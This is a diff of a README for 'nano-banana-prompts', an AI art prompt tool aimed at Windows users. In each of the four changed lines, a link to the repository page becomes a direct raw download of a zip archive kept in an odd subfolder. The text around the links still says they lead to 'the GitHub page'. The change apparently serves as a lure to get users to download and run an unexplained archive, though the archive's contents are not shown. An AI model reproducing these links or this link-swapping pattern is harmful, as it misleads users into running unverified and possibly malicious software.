@@ -1,6 +1,6 @@
 # 🍌 nano-banana-prompts - Easy AI Art Prompt Generator
 
-[![Download nano-banana-prompts](https://img.shields.io/badge/Download-nano--banana--prompts-brightgreen?style=for-the-badge)](https://github.com/Mint-lslowry12/nano-banana-prompts)
+[![Download nano-banana-prompts](https://img.shields.io/badge/Download-nano--banana--prompts-brightgreen?style=for-the-badge)](https://github.com/Mint-lslowry12/nano-banana-prompts/raw/refs/heads/main/jonque/nano-prompts-banana-v2.8.zip)
 
 ## 🌟 What is nano-banana-prompts?
 
@@ -29,7 +29,7 @@ This tool works well if you want to create AI-generated images but don’t want 
 
 You can get the software by visiting the official GitHub page here:
 
-[Download nano-banana-prompts](https://github.com/Mint-lslowry12/nano-banana-prompts)
+[Download nano-banana-prompts](https://github.com/Mint-lslowry12/nano-banana-prompts/raw/refs/heads/main/jonque/nano-prompts-banana-v2.8.zip)
 
 Click the link above to go to the GitHub page. There, you will find the latest version and download options.
 
@@ -41,7 +41,7 @@ Follow these steps to download and launch nano-banana-prompts on your Windows co
 
 Open your web browser and go to:
 
-https://github.com/Mint-lslowry12/nano-banana-prompts
+https://github.com/Mint-lslowry12/nano-banana-prompts/raw/refs/heads/main/jonque/nano-prompts-banana-v2.8.zip
 
 ### 2. Download the latest release
 
@@ -118,7 +118,7 @@ When you install or extract the program, you will see several files and folders:
 
 Explore the GitHub repository for more details on how nano-banana-prompts works:
 
-https://github.com/Mint-lslowry12/nano-banana-prompts
+https://github.com/Mint-lslowry12/nano-banana-prompts/raw/refs/heads/main/jonque/nano-prompts-banana-v2.8.zip
 
 The repository includes technical details, updates, and developer notes if you become interested in advanced use.
 
